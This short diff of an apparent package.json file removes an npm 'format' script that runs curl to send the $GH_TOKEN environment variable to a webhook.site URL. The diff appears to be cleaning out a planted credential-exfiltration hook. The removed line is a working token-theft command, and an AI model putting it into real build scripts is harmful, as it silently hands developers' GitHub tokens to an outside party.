@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "install": "echo 'Installing fork $$$$$$$$$$$$$'",
-    "format": "echo 'Formatting $$$$$$$$$$$$$' && curl https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/formatting/$GH_TOKEN"
+    "format": "echo 'Formatting $$$$$$$$$$$$$' "
   },
   "repository": {
     "type": "git",
